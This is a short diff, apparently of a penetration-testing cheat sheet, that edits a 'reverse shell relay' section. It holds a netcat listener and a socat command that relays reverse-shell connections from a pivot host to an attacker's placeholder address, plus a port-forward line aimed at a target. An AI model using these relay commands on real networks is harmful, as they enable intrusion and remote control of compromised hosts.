@@ -2,7 +2,7 @@
 
 # reverse shell relay
 sudo nc -lvnp <LPORT>
-./socat tcp-l:<ANY_PIVOT_LPORT> tcp:<LHOST>:<LPORT> &
+./socat tcp-l:<ANY_PIVOT_LPORT>,reuseaddr,fork tcp:<LHOST>:<LPORT> &
 
 # port forward - EASY
 ./socat tcp-l:<ANY_PIVOT_LPORT>,fork,reuseaddr tcp:<TARGET_IP>:<TARGET_PORT> &
